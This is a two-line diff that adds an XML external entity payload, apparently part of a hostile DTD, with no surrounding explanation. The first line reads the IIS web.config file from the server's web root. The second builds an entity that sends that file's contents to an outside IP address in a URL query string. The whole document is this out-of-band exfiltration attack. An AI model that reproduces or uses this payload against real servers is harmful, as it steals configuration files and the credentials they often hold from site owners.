@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "file:///C:\inetpub\wwwroot\web.config">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://144.202.4.228/?%data;'>">
